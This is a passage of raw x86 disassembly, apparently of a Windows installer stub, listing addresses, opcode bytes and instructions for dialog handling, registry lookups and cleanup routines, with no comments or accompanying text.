  403a3f:	ff 15 dc 80 40 00    	call   *0x4080dc
  403a45:	f6 c4 04             	test   $0x4,%ah
  403a48:	75 1f                	jne    0x403a69
  403a4a:	57                   	push   %edi
  403a4b:	ff 15 44 81 40 00    	call   *0x408144
  403a51:	85 c0                	test   %eax,%eax
  403a53:	74 14                	je     0x403a69
  403a55:	6a 01                	push   $0x1
  403a57:	56                   	push   %esi
  403a58:	e8 61 22 00 00       	call   0x405cbe
  403a5d:	8b 44 24 10          	mov    0x10(%esp),%eax
  403a61:	ff 44 24 10          	incl   0x10(%esp)
  403a65:	85 c0                	test   %eax,%eax
  403a67:	74 99                	je     0x403a02
  403a69:	ff 44 24 14          	incl   0x14(%esp)
  403a6d:	33 ed                	xor    %ebp,%ebp
  403a6f:	66 39 6c 24 14       	cmp    %bp,0x14(%esp)
  403a74:	75 83                	jne    0x4039f9
  403a76:	eb 60                	jmp    0x403ad8
  403a78:	56                   	push   %esi
  403a79:	ff 15 e0 80 40 00    	call   *0x4080e0
  403a7f:	6a 00                	push   $0x0
  403a81:	56                   	push   %esi
  403a82:	e8 eb 28 00 00       	call   0x406372
  403a87:	6a 01                	push   $0x1
  403a89:	57                   	push   %edi
  403a8a:	68 00 28 44 00       	push   $0x442800
  403a8f:	ff 15 6c 81 40 00    	call   *0x40816c
  403a95:	85 c0                	test   %eax,%eax
  403a97:	74 3d                	je     0x403ad6
  403a99:	6a 00                	push   $0x0
  403a9b:	57                   	push   %edi
  403a9c:	e8 d1 28 00 00       	call   0x406372
  403aa1:	a1 10 47 43 00       	mov    0x434710,%eax
  403aa6:	ff b0 24 01 00 00    	push   0x124(%eax)
  403aac:	53                   	push   %ebx
  403aad:	e8 3d 2b 00 00       	call   0x4065ef
  403ab2:	53                   	push   %ebx
  403ab3:	e8 dd 20 00 00       	call   0x405b95
  403ab8:	85 c0                	test   %eax,%eax
  403aba:	75 44                	jne    0x403b00
  403abc:	8b 44 24 10          	mov    0x10(%esp),%eax
  403ac0:	ff 44 24 10          	incl   0x10(%esp)
  403ac4:	85 c0                	test   %eax,%eax
  403ac6:	75 0e                	jne    0x403ad6
  403ac8:	57                   	push   %edi
  403ac9:	e8 41 2e 00 00       	call   0x40690f
  403ace:	85 c0                	test   %eax,%eax
  403ad0:	0f 84 2c ff ff ff    	je     0x403a02
  403ad6:	33 ed                	xor    %ebp,%ebp
  403ad8:	e8 cd 00 00 00       	call   0x403baa
  403add:	ff 15 94 82 40 00    	call   *0x408294
  403ae3:	39 6c 24 18          	cmp    %ebp,0x18(%esp)
  403ae7:	5b                   	pop    %ebx
  403ae8:	74 24                	je     0x403b0e
  403aea:	68 10 00 20 00       	push   $0x200010
  403aef:	ff 74 24 18          	push   0x18(%esp)
  403af3:	e8 1a 21 00 00       	call   0x405c12
  403af8:	6a 02                	push   $0x2
  403afa:	ff 15 bc 80 40 00    	call   *0x4080bc
  403b00:	50                   	push   %eax
  403b01:	ff 15 fc 80 40 00    	call   *0x4080fc
  403b07:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  403b0c:	eb c8                	jmp    0x403ad6
  403b0e:	39 2d 94 47 43 00    	cmp    %ebp,0x434794
  403b14:	74 7c                	je     0x403b92
  403b16:	8d 44 24 20          	lea    0x20(%esp),%eax
  403b1a:	50                   	push   %eax
  403b1b:	6a 28                	push   $0x28
  403b1d:	ff 15 c0 80 40 00    	call   *0x4080c0
  403b23:	50                   	push   %eax
  403b24:	ff 15 24 80 40 00    	call   *0x408024
  403b2a:	85 c0                	test   %eax,%eax
  403b2c:	74 34                	je     0x403b62
  403b2e:	8d 44 24 28          	lea    0x28(%esp),%eax
  403b32:	50                   	push   %eax
  403b33:	68 30 a2 40 00       	push   $0x40a230
  403b38:	55                   	push   %ebp
  403b39:	ff 15 20 80 40 00    	call   *0x408020
  403b3f:	55                   	push   %ebp
  403b40:	55                   	push   %ebp
  403b41:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403b45:	55                   	push   %ebp
  403b46:	50                   	push   %eax
  403b47:	55                   	push   %ebp
  403b48:	ff 74 24 34          	push   0x34(%esp)
  403b4c:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  403b53:	00 
  403b54:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%esp)
  403b5b:	00 
  403b5c:	ff 15 1c 80 40 00    	call   *0x40801c
  403b62:	6a 04                	push   $0x4
  403b64:	e8 3d 2e 00 00       	call   0x4069a6
  403b69:	3b c5                	cmp    %ebp,%eax
  403b6b:	be 02 00 04 80       	mov    $0x80040002,%esi
  403b70:	74 0c                	je     0x403b7e
  403b72:	56                   	push   %esi
  403b73:	6a 25                	push   $0x25
  403b75:	55                   	push   %ebp
  403b76:	55                   	push   %ebp
  403b77:	55                   	push   %ebp
  403b78:	ff d0                	call   *%eax
  403b7a:	85 c0                	test   %eax,%eax
  403b7c:	74 0d                	je     0x403b8b
  403b7e:	56                   	push   %esi
  403b7f:	6a 02                	push   $0x2
  403b81:	ff 15 0c 82 40 00    	call   *0x40820c
  403b87:	85 c0                	test   %eax,%eax
  403b89:	75 07                	jne    0x403b92
  403b8b:	6a 09                	push   $0x9
  403b8d:	e8 79 d8 ff ff       	call   0x40140b
  403b92:	a1 ac 47 43 00       	mov    0x4347ac,%eax
  403b97:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b9a:	74 04                	je     0x403ba0
  403b9c:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403ba0:	ff 74 24 1c          	push   0x1c(%esp)
  403ba4:	ff 15 bc 80 40 00    	call   *0x4080bc
  403baa:	a1 18 a0 40 00       	mov    0x40a018,%eax
  403baf:	83 f8 ff             	cmp    $0xffffffff,%eax
  403bb2:	74 0e                	je     0x403bc2
  403bb4:	50                   	push   %eax
  403bb5:	ff 15 fc 80 40 00    	call   *0x4080fc
  403bbb:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  403bc2:	e8 28 00 00 00       	call   0x403bef
  403bc7:	6a 07                	push   $0x7
  403bc9:	68 00 20 44 00       	push   $0x442000
  403bce:	e8 eb 20 00 00       	call   0x405cbe
  403bd3:	c3                   	ret
  403bd4:	56                   	push   %esi
  403bd5:	8b 35 2c aa 42 00    	mov    0x42aa2c,%esi
  403bdb:	eb 0a                	jmp    0x403be7
  403bdd:	ff 74 24 08          	push   0x8(%esp)
  403be1:	ff 56 04             	call   *0x4(%esi)
  403be4:	8b 36                	mov    (%esi),%esi
  403be6:	59                   	pop    %ecx
  403be7:	85 f6                	test   %esi,%esi
  403be9:	75 f2                	jne    0x403bdd
  403beb:	5e                   	pop    %esi
  403bec:	c2 04 00             	ret    $0x4
  403bef:	56                   	push   %esi
  403bf0:	8b 35 2c aa 42 00    	mov    0x42aa2c,%esi
  403bf6:	6a 00                	push   $0x0
  403bf8:	e8 d7 ff ff ff       	call   0x403bd4
  403bfd:	85 f6                	test   %esi,%esi
  403bff:	74 1a                	je     0x403c1b
  403c01:	57                   	push   %edi
  403c02:	8b fe                	mov    %esi,%edi
  403c04:	8b 36                	mov    (%esi),%esi
  403c06:	ff 77 08             	push   0x8(%edi)
  403c09:	ff 15 1c 81 40 00    	call   *0x40811c
  403c0f:	57                   	push   %edi
  403c10:	ff 15 0c 81 40 00    	call   *0x40810c
  403c16:	85 f6                	test   %esi,%esi
  403c18:	75 e8                	jne    0x403c02
  403c1a:	5f                   	pop    %edi
  403c1b:	83 25 2c aa 42 00 00 	andl   $0x0,0x42aa2c
  403c22:	5e                   	pop    %esi
  403c23:	c3                   	ret
  403c24:	a1 2c aa 42 00       	mov    0x42aa2c,%eax
  403c29:	eb 0b                	jmp    0x403c36
  403c2b:	8b 48 08             	mov    0x8(%eax),%ecx
  403c2e:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403c32:	74 0a                	je     0x403c3e
  403c34:	8b 00                	mov    (%eax),%eax
  403c36:	85 c0                	test   %eax,%eax
  403c38:	75 f1                	jne    0x403c2b
  403c3a:	40                   	inc    %eax
  403c3b:	c2 04 00             	ret    $0x4
  403c3e:	33 c0                	xor    %eax,%eax
  403c40:	eb f9                	jmp    0x403c3b
  403c42:	56                   	push   %esi
  403c43:	8b 74 24 08          	mov    0x8(%esp),%esi
  403c47:	56                   	push   %esi
  403c48:	e8 d7 ff ff ff       	call   0x403c24
  403c4d:	85 c0                	test   %eax,%eax
  403c4f:	75 03                	jne    0x403c54
  403c51:	40                   	inc    %eax
  403c52:	eb 2c                	jmp    0x403c80
  403c54:	6a 0c                	push   $0xc
  403c56:	6a 40                	push   $0x40
  403c58:	ff 15 10 81 40 00    	call   *0x408110
  403c5e:	85 c0                	test   %eax,%eax
  403c60:	74 1b                	je     0x403c7d
  403c62:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403c66:	89 70 08             	mov    %esi,0x8(%eax)
  403c69:	89 48 04             	mov    %ecx,0x4(%eax)
  403c6c:	8b 0d 2c aa 42 00    	mov    0x42aa2c,%ecx
  403c72:	89 08                	mov    %ecx,(%eax)
  403c74:	a3 2c aa 42 00       	mov    %eax,0x42aa2c
  403c79:	33 c0                	xor    %eax,%eax
  403c7b:	eb 03                	jmp    0x403c80
  403c7d:	83 c8 ff             	or     $0xffffffff,%eax
  403c80:	5e                   	pop    %esi
  403c81:	c2 08 00             	ret    $0x8
  403c84:	83 ec 10             	sub    $0x10,%esp
  403c87:	53                   	push   %ebx
  403c88:	55                   	push   %ebp
  403c89:	56                   	push   %esi
  403c8a:	8b 35 10 47 43 00    	mov    0x434710,%esi
  403c90:	57                   	push   %edi
  403c91:	6a 02                	push   $0x2
  403c93:	e8 0e 2d 00 00       	call   0x4069a6
  403c98:	33 ff                	xor    %edi,%edi
  403c9a:	3b c7                	cmp    %edi,%eax
  403c9c:	74 12                	je     0x403cb0
  403c9e:	ff d0                	call   *%eax
  403ca0:	0f b7 c0             	movzwl %ax,%eax
  403ca3:	50                   	push   %eax
  403ca4:	68 00 10 44 00       	push   $0x441000
  403ca9:	e8 4b 28 00 00       	call   0x4064f9
  403cae:	eb 5a                	jmp    0x403d0a
  403cb0:	bb 68 ca 42 00       	mov    $0x42ca68,%ebx
  403cb5:	57                   	push   %edi
  403cb6:	53                   	push   %ebx
  403cb7:	57                   	push   %edi
  403cb8:	68 90 83 40 00       	push   $0x408390
  403cbd:	68 01 00 00 80       	push   $0x80000001
  403cc2:	66 c7 05 00 10 44 00 	movw   $0x30,0x441000
  403cc9:	30 00 
  403ccb:	66 c7 05 02 10 44 00 	movw   $0x78,0x441002
  403cd2:	78 00 
  403cd4:	66 89 3d 04 10 44 00 	mov    %di,0x441004
  403cdb:	e8 a0 27 00 00       	call   0x406480
  403ce0:	66 39 3d 68 ca 42 00 	cmp    %di,0x42ca68
  403ce7:	75 16                	jne    0x403cff
  403ce9:	57                   	push   %edi
  403cea:	53                   	push   %ebx
  403ceb:	68 cc 83 40 00       	push   $0x4083cc
  403cf0:	68 40 83 40 00       	push   $0x408340
  403cf5:	68 03 00 00 80       	push   $0x80000003
  403cfa:	e8 81 27 00 00       	call   0x406480
  403cff:	53                   	push   %ebx
  403d00:	68 00 10 44 00       	push   $0x441000
  403d05:	e8 c4 28 00 00       	call   0x4065ce
  403d0a:	e8 4b 02 00 00       	call   0x403f5a
  403d0f:	a1 18 47 43 00       	mov    0x434718,%eax
  403d14:	bd 00 f8 43 00       	mov    $0x43f800,%ebp
  403d19:	83 e0 20             	and    $0x20,%eax
  403d1c:	55                   	push   %ebp
  403d1d:	a3 80 47 43 00       	mov    %eax,0x434780
  403d22:	c7 05 9c 47 43 00 00 	movl   $0x10000,0x43479c
  403d29:	00 01 00 
  403d2c:	e8 58 22 00 00       	call   0x405f89
  403d31:	85 c0                	test   %eax,%eax
  403d33:	0f 85 8c 00 00 00    	jne    0x403dc5
  403d39:	8b 4e 48             	mov    0x48(%esi),%ecx
  403d3c:	3b cf                	cmp    %edi,%ecx
  403d3e:	0f 84 81 00 00 00    	je     0x403dc5
  403d44:	8b 56 4c             	mov    0x4c(%esi),%edx
  403d47:	a1 38 47 43 00       	mov    0x434738,%eax
  403d4c:	bb a0 26 43 00       	mov    $0x4326a0,%ebx
  403d51:	57                   	push   %edi
  403d52:	8d 14 50             	lea    (%eax,%edx,2),%edx
  403d55:	53                   	push   %ebx
  403d56:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  403d59:	52                   	push   %edx
  403d5a:	50                   	push   %eax
  403d5b:	ff 76 44             	push   0x44(%esi)
  403d5e:	e8 1d 27 00 00       	call   0x406480
  403d63:	66 a1 a0 26 43 00    	mov    0x4326a0,%ax
  403d69:	66 3b c7             	cmp    %di,%ax
  403d6c:	74 57                	je     0x403dc5
  403d6e:	66 3d 22 00          	cmp    $0x22,%ax
  403d72:	75 10                	jne    0x403d84
  403d74:	bb a2 26 43 00       	mov    $0x4326a2,%ebx
  403d79:	6a 22                	push   $0x22
  403d7b:	53                   	push   %ebx
  403d7c:	e8 2d 21 00 00       	call   0x405eae
  403d81:	66 89 38             	mov    %di,(%eax)
  403d84:	53                   	push   %ebx
  403d85:	e8 3e 28 00 00       	call   0x4065c8
  403d8a:	8d 44 43 f8          	lea    -0x8(%ebx,%eax,2),%eax
  403d8e:	3b c3                	cmp    %ebx,%eax
  403d90:	76 26                	jbe    0x403db8
  403d92:	68 80 a3 40 00       	push   $0x40a380
  403d97:	50                   	push   %eax
  403d98:	ff 15 00 81 40 00    	call   *0x408100
  403d9e:	85 c0                	test   %eax,%eax
  403da0:	75 16                	jne    0x403db8
  403da2:	53                   	push   %ebx
  403da3:	ff 15 dc 80 40 00    	call   *0x4080dc
  403da9:	83 f8 ff             	cmp    $0xffffffff,%eax
  403dac:	74 04                	je     0x403db2
  403dae:	a8 10                	test   $0x10,%al
  403db0:	75 06                	jne    0x403db8
  403db2:	53                   	push   %ebx
  403db3:	e8 15 21 00 00       	call   0x405ecd
  403db8:	53                   	push   %ebx
  403db9:	e8 c3 20 00 00       	call   0x405e81
  403dbe:	50                   	push   %eax
  403dbf:	55                   	push   %ebp
  403dc0:	e8 ed 27 00 00       	call   0x4065b2
  403dc5:	55                   	push   %ebp
  403dc6:	e8 be 21 00 00       	call   0x405f89
  403dcb:	85 c0                	test   %eax,%eax
  403dcd:	75 0c                	jne    0x403ddb
  403dcf:	ff b6 18 01 00 00    	push   0x118(%esi)
  403dd5:	55                   	push   %ebp
  403dd6:	e8 14 28 00 00       	call   0x4065ef
  403ddb:	68 40 80 00 00       	push   $0x8040
  403de0:	57                   	push   %edi
  403de1:	57                   	push   %edi
  403de2:	6a 01                	push   $0x1
  403de4:	6a 67                	push   $0x67
  403de6:	ff 35 00 47 43 00    	push   0x434700
  403dec:	ff 15 44 82 40 00    	call   *0x408244
  403df2:	a3 e8 36 43 00       	mov    %eax,0x4336e8
  403df7:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403dfb:	bb a0 36 43 00       	mov    $0x4336a0,%ebx
  403e00:	74 7f                	je     0x403e81
  403e02:	8b 0d 00 47 43 00    	mov    0x434700,%ecx
  403e08:	be 78 a3 40 00       	mov    $0x40a378,%esi
  403e0d:	53                   	push   %ebx
  403e0e:	c7 05 a4 36 43 00 00 	movl   $0x401000,0x4336a4
  403e15:	10 40 00 
  403e18:	89 0d b0 36 43 00    	mov    %ecx,0x4336b0
  403e1e:	a3 b4 36 43 00       	mov    %eax,0x4336b4
  403e23:	89 35 c4 36 43 00    	mov    %esi,0x4336c4
  403e29:	ff 15 f4 81 40 00    	call   *0x4081f4
  403e2f:	66 85 c0             	test   %ax,%ax
  403e32:	0f 84 18 01 00 00    	je     0x403f50
  403e38:	8d 44 24 10          	lea    0x10(%esp),%eax
  403e3c:	57                   	push   %edi
  403e3d:	50                   	push   %eax
  403e3e:	57                   	push   %edi
  403e3f:	6a 30                	push   $0x30
  403e41:	ff 15 f8 81 40 00    	call   *0x4081f8
  403e47:	57                   	push   %edi
  403e48:	ff 35 00 47 43 00    	push   0x434700
  403e4e:	8b 44 24 24          	mov    0x24(%esp),%eax
  403e52:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403e56:	57                   	push   %edi
  403e57:	57                   	push   %edi
  403e58:	50                   	push   %eax
  403e59:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403e5d:	2b 44 24 24          	sub    0x24(%esp),%eax
  403e61:	50                   	push   %eax
  403e62:	ff 74 24 2c          	push   0x2c(%esp)
  403e66:	ff 74 24 2c          	push   0x2c(%esp)
  403e6a:	68 00 00 00 80       	push   $0x80000000
  403e6f:	57                   	push   %edi
  403e70:	56                   	push   %esi
  403e71:	68 80 00 00 00       	push   $0x80
  403e76:	ff 15 80 82 40 00    	call   *0x408280
  403e7c:	a3 48 ca 42 00       	mov    %eax,0x42ca48
  403e81:	57                   	push   %edi
  403e82:	e8 84 d5 ff ff       	call   0x40140b
  403e87:	85 c0                	test   %eax,%eax
  403e89:	74 08                	je     0x403e93
  403e8b:	6a 02                	push   $0x2
  403e8d:	58                   	pop    %eax
  403e8e:	e9 bf 00 00 00       	jmp    0x403f52
  403e93:	e8 c2 00 00 00       	call   0x403f5a
  403e98:	39 3d a0 47 43 00    	cmp    %edi,0x4347a0
  403e9e:	0f 85 83 00 00 00    	jne    0x403f27
  403ea4:	6a 05                	push   $0x5
  403ea6:	ff 35 48 ca 42 00    	push   0x42ca48
  403eac:	ff 15 28 82 40 00    	call   *0x408228
  403eb2:	68 34 83 40 00       	push   $0x408334
  403eb7:	e8 7a 2a 00 00       	call   0x406936
  403ebc:	85 c0                	test   %eax,%eax
  403ebe:	75 0a                	jne    0x403eca
  403ec0:	68 28 83 40 00       	push   $0x408328
  403ec5:	e8 6c 2a 00 00       	call   0x406936
  403eca:	8b 35 00 82 40 00    	mov    0x408200,%esi
  403ed0:	bd 10 83 40 00       	mov    $0x408310,%ebp
  403ed5:	53                   	push   %ebx
  403ed6:	55                   	push   %ebp
  403ed7:	57                   	push   %edi
  403ed8:	ff d6                	call   *%esi
  403eda:	85 c0                	test   %eax,%eax
  403edc:	75 16                	jne    0x403ef4
  403ede:	53                   	push   %ebx
  403edf:	68 fc 82 40 00       	push   $0x4082fc
  403ee4:	57                   	push   %edi
  403ee5:	ff d6                	call   *%esi
  403ee7:	53                   	push   %ebx
  403ee8:	89 2d c4 36 43 00    	mov    %ebp,0x4336c4
  403eee:	ff 15 f4 81 40 00    	call   *0x4081f4
  403ef4:	a1 e0 36 43 00       	mov    0x4336e0,%eax
  403ef9:	57                   	push   %edi
  403efa:	83 c0 69             	add    $0x69,%eax
  403efd:	68 32 40 40 00       	push   $0x404032
  403f02:	0f b7 c0             	movzwl %ax,%eax
  403f05:	57                   	push   %edi
  403f06:	50                   	push   %eax
  403f07:	ff 35 00 47 43 00    	push   0x434700
  403f0d:	ff 15 04 82 40 00    	call   *0x408204
  403f13:	6a 05                	push   $0x5
  403f15:	8b f0                	mov    %eax,%esi
  403f17:	e8 ef d4 ff ff       	call   0x40140b
  403f1c:	6a 01                	push   $0x1
  403f1e:	e8 b1 fc ff ff       	call   0x403bd4
  403f23:	8b c6                	mov    %esi,%eax
  403f25:	eb 2b                	jmp    0x403f52
  403f27:	57                   	push   %edi
  403f28:	e8 dd 17 00 00       	call   0x40570a
  403f2d:	85 c0                	test   %eax,%eax
  403f2f:	74 18                	je     0x403f49
  403f31:	39 3d cc 36 43 00    	cmp    %edi,0x4336cc
  403f37:	0f 85 4e ff ff ff    	jne    0x403e8b
  403f3d:	6a 02                	push   $0x2
  403f3f:	e8 c7 d4 ff ff       	call   0x40140b
  403f44:	e9 42 ff ff ff       	jmp    0x403e8b
  403f49:	6a 01                	push   $0x1
  403f4b:	e8 bb d4 ff ff       	call   0x40140b
  403f50:	33 c0                	xor    %eax,%eax
  403f52:	5f                   	pop    %edi
  403f53:	5e                   	pop    %esi
  403f54:	5d                   	pop    %ebp
  403f55:	5b                   	pop    %ebx
  403f56:	83 c4 10             	add    $0x10,%esp
  403f59:	c3                   	ret
  403f5a:	53                   	push   %ebx
  403f5b:	55                   	push   %ebp
  403f5c:	56                   	push   %esi
  403f5d:	57                   	push   %edi
  403f5e:	bf 00 10 44 00       	mov    $0x441000,%edi
  403f63:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403f68:	57                   	push   %edi
  403f69:	e8 a4 25 00 00       	call   0x406512
  403f6e:	8b 35 44 47 43 00    	mov    0x434744,%esi
  403f74:	85 f6                	test   %esi,%esi
  403f76:	74 45                	je     0x403fbd
  403f78:	8b 0d 10 47 43 00    	mov    0x434710,%ecx
  403f7e:	8b 49 64             	mov    0x64(%ecx),%ecx
  403f81:	8b d1                	mov    %ecx,%edx
  403f83:	0f af ce             	imul   %esi,%ecx
  403f86:	f7 da                	neg    %edx
  403f88:	03 0d 40 47 43 00    	add    0x434740,%ecx
  403f8e:	03 ca                	add    %edx,%ecx
  403f90:	4e                   	dec    %esi
  403f91:	66 8b 29             	mov    (%ecx),%bp
  403f94:	66 33 e8             	xor    %ax,%bp
  403f97:	23 eb                	and    %ebx,%ebp
  403f99:	66 85 ed             	test   %bp,%bp
  403f9c:	74 06                	je     0x403fa4
  403f9e:	85 f6                	test   %esi,%esi
  403fa0:	75 ec                	jne    0x403f8e
  403fa2:	eb 19                	jmp    0x403fbd
  403fa4:	8b 51 02             	mov    0x2(%ecx),%edx
  403fa7:	89 15 e0 36 43 00    	mov    %edx,0x4336e0
  403fad:	8b 51 06             	mov    0x6(%ecx),%edx
  403fb0:	89 15 a8 47 43 00    	mov    %edx,0x4347a8
  403fb6:	8d 51 0a             	lea    0xa(%ecx),%edx
  403fb9:	85 d2                	test   %edx,%edx
  403fbb:	75 12                	jne    0x403fcf
  403fbd:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403fc2:	75 07                	jne    0x403fcb
  403fc4:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403fc9:	eb a3                	jmp    0x403f6e
  403fcb:	33 db                	xor    %ebx,%ebx
  403fcd:	eb 9f                	jmp    0x403f6e
  403fcf:	89 15 dc 36 43 00    	mov    %edx,0x4336dc
  403fd5:	0f b7 01             	movzwl (%ecx),%eax
  403fd8:	50                   	push   %eax
  403fd9:	57                   	push   %edi
  403fda:	e8 1a 25 00 00       	call   0x4064f9
  403fdf:	e8 2f 00 00 00       	call   0x404013
  403fe4:	a1 2c 47 43 00       	mov    0x43472c,%eax
  403fe9:	8b 35 28 47 43 00    	mov    0x434728,%esi
  403fef:	85 c0                	test   %eax,%eax
  403ff1:	74 1b                	je     0x40400e
  403ff3:	8b f8                	mov    %eax,%edi
  403ff5:	8b 06                	mov    (%esi),%eax
  403ff7:	85 c0                	test   %eax,%eax
  403ff9:	74 0a                	je     0x404005
  403ffb:	50                   	push   %eax
  403ffc:	8d 46 18             	lea    0x18(%esi),%eax
  403fff:	50                   	push   %eax
  404000:	e8 ea 25 00 00       	call   0x4065ef
  404005:	81 c6 18 08 00 00    	add    $0x818,%esi
  40400b:	4f                   	dec    %edi
  40400c:	75 e7                	jne    0x403ff5
  40400e:	5f                   	pop    %edi
  40400f:	5e                   	pop    %esi
  404010:	5d                   	pop    %ebp
  404011:	5b                   	pop    %ebx
  404012:	c3                   	ret
  404013:	56                   	push   %esi
  404014:	be 00 37 43 00       	mov    $0x433700,%esi
  404019:	6a fe                	push   $0xfffffffe
  40401b:	56                   	push   %esi
  40401c:	e8 ce 25 00 00       	call   0x4065ef
  404021:	56                   	push   %esi
  404022:	ff 35 48 ca 42 00    	push   0x42ca48
  404028:	ff 15 1c 82 40 00    	call   *0x40821c
  40402e:	8b c6                	mov    %esi,%eax
  404030:	5e                   	pop    %esi
  404031:	c3                   	ret
  404032:	83 ec 10             	sub    $0x10,%esp
  404035:	b9 10 01 00 00       	mov    $0x110,%ecx
  40403a:	53                   	push   %ebx
  40403b:	55                   	push   %ebp
  40403c:	56                   	push   %esi
  40403d:	8b 74 24 24          	mov    0x24(%esp),%esi
  404041:	3b f1                	cmp    %ecx,%esi
  404043:	57                   	push   %edi
  404044:	0f 84 61 01 00 00    	je     0x4041ab
  40404a:	81 fe 08 04 00 00    	cmp    $0x408,%esi
  404050:	0f 84 55 01 00 00    	je     0x4041ab
  404056:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40405a:	33 ed                	xor    %ebp,%ebp
  40405c:	83 fe 47             	cmp    $0x47,%esi
  40405f:	75 13                	jne    0x404074
  404061:	6a 13                	push   $0x13
  404063:	55                   	push   %ebp
  404064:	55                   	push   %ebp
  404065:	55                   	push   %ebp
  404066:	55                   	push   %ebp
  404067:	57                   	push   %edi
  404068:	ff 35 48 ca 42 00    	push   0x42ca48
  40406e:	ff 15 d0 81 40 00    	call   *0x4081d0
  404074:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  404078:	83 fe 05             	cmp    $0x5,%esi
  40407b:	75 42                	jne    0x4040bf
  40407d:	8b c3                	mov    %ebx,%eax
  40407f:	48                   	dec    %eax
  404080:	f7 d8                	neg    %eax
  404082:	1b c0                	sbb    %eax,%eax
  404084:	83 e0 05             	and    $0x5,%eax
  404087:	50                   	push   %eax
  404088:	ff 35 48 ca 42 00    	push   0x42ca48
  40408e:	ff 15 28 82 40 00    	call   *0x408228
  404094:	83 fb 02             	cmp    $0x2,%ebx
  404097:	0f 85 fb 00 00 00    	jne    0x404198
  40409d:	6a f0                	push   $0xfffffff0
  40409f:	57                   	push   %edi
  4040a0:	ff 15 d4 81 40 00    	call   *0x4081d4
  4040a6:	25 00 00 01 21       	and    $0x21010000,%eax
  4040ab:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  4040b0:	0f 85 e2 00 00 00    	jne    0x404198
  4040b6:	6a 04                	push   $0x4
  4040b8:	57                   	push   %edi
  4040b9:	ff 15 28 82 40 00    	call   *0x408228
  4040bf:	81 fe 0d 04 00 00    	cmp    $0x40d,%esi
  4040c5:	75 17                	jne    0x4040de
  4040c7:	ff 35 d8 36 43 00    	push   0x4336d8
  4040cd:	ff 15 10 82 40 00    	call   *0x408210
  4040d3:	89 1d d8 36 43 00    	mov    %ebx,0x4336d8
  4040d9:	e9 fd 03 00 00       	jmp    0x4044db
  4040de:	83 fe 11             	cmp    $0x11,%esi
  4040e1:	75 11                	jne    0x4040f4
  4040e3:	55                   	push   %ebp
  4040e4:	55                   	push   %ebp
  4040e5:	57                   	push   %edi
  4040e6:	ff 15 40 82 40 00    	call   *0x408240
  4040ec:	33 c0                	xor    %eax,%eax
  4040ee:	40                   	inc    %eax
  4040ef:	e9 0c 04 00 00       	jmp    0x404500
  4040f4:	81 fe 11 01 00 00    	cmp    $0x111,%esi
  4040fa:	0f 85 98 00 00 00    	jne    0x404198
  404100:	0f b7 f3             	movzwl %bx,%esi
  404103:	56                   	push   %esi
  404104:	57                   	push   %edi
  404105:	ff 15 3c 82 40 00    	call   *0x40823c
  40410b:	8b f8                	mov    %eax,%edi
  40410d:	3b fd                	cmp    %ebp,%edi
  40410f:	74 1d                	je     0x40412e
  404111:	55                   	push   %ebp
  404112:	55                   	push   %ebp
  404113:	68 f3 00 00 00       	push   $0xf3
  404118:	57                   	push   %edi
  404119:	ff 15 58 82 40 00    	call   *0x408258
  40411f:	57                   	push   %edi
  404120:	ff 15 d8 81 40 00    	call   *0x4081d8
  404126:	85 c0                	test   %eax,%eax
  404128:	0f 84 d0 03 00 00    	je     0x4044fe
  40412e:	83 fe 01             	cmp    $0x1,%esi
  404131:	75 03                	jne    0x404136
  404133:	56                   	push   %esi
  404134:	eb 2e                	jmp    0x404164
  404136:	83 fe 03             	cmp    $0x3,%esi
  404139:	75 0c                	jne    0x404147
  40413b:	39 2d 60 a3 40 00    	cmp    %ebp,0x40a360
  404141:	7e 3f                	jle    0x404182
  404143:	6a ff                	push   $0xffffffff
  404145:	eb 1d                	jmp    0x404164
  404147:	6a 02                	push   $0x2
  404149:	5f                   	pop    %edi
  40414a:	3b f7                	cmp    %edi,%esi
  40414c:	75 34                	jne    0x404182
  40414e:	39 2d 8c 47 43 00    	cmp    %ebp,0x43478c
  404154:	74 15                	je     0x40416b
  404156:	57                   	push   %edi
  404157:	e8 af d2 ff ff       	call   0x40140b
  40415c:	89 3d 38 b2 42 00    	mov    %edi,0x42b238
  404162:	6a 78                	push   $0x78
  404164:	e8 a1 03 00 00       	call   0x40450a
  404169:	eb 2d                	jmp    0x404198
  40416b:	6a 03                	push   $0x3
  40416d:	e8 99 d2 ff ff       	call   0x40140b
  404172:	85 c0                	test   %eax,%eax
  404174:	75 22                	jne    0x404198
  404176:	c7 05 38 b2 42 00 01 	movl   $0x1,0x42b238
  40417d:	00 00 00 
  404180:	eb e0                	jmp    0x404162
  404182:	ff 74 24 30          	push   0x30(%esp)
  404186:	53                   	push   %ebx
  404187:	68 11 01 00 00       	push   $0x111
  40418c:	ff 35 d8 36 43 00    	push   0x4336d8
  404192:	ff 15 58 82 40 00    	call   *0x408258
  404198:	ff 74 24 30          	push   0x30(%esp)
  40419c:	53                   	push   %ebx
  40419d:	ff 74 24 30          	push   0x30(%esp)
  4041a1:	e8 f2 03 00 00       	call   0x404598
  4041a6:	e9 55 03 00 00       	jmp    0x404500
  4041ab:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4041af:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4041b3:	3b f1                	cmp    %ecx,%esi
  4041b5:	a3 50 ca 42 00       	mov    %eax,0x42ca50
  4041ba:	75 4d                	jne    0x404209
  4041bc:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  4041c2:	6a 01                	push   $0x1
  4041c4:	57                   	push   %edi
  4041c5:	89 3d 08 47 43 00    	mov    %edi,0x434708
  4041cb:	ff d6                	call   *%esi
  4041cd:	6a 02                	push   $0x2
